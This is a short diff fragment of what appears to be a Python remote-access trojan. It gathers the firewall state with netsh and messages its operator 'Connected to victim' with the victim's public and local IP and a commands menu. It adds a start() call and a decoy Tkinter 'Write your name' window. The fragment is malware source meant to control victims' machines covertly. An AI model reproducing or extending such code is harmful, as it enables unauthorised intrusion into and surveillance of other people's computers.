@@ -350,8 +350,8 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                     except: send_msg("Error;")
                 send_msg("click /pass")
                 sleep(5)
-    send_msg(f"Connected to victim at {strftime("%H : %M : %S")} with {ip} IP. Wait for closing the trap.")
     send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(/commands for help).")
+    start()
     from tkinter import * 
     root = Tk()
     Label(root, text="Write your name:", font=("", 15)).place(x=15, y=50)
